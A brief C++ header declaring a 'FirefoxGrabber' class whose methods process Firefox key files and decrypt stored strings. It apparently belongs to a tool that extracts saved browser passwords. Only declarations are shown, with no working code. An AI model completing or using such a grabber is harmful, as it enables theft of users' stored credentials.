#pragma once
class FirefoxGrabber
{
	vector<vector<byte>> key;
public:
	void ProcessKey(string fileName, bool isKey3);
	
	string DecryptStr(string str);
	bool IsSuccess();
};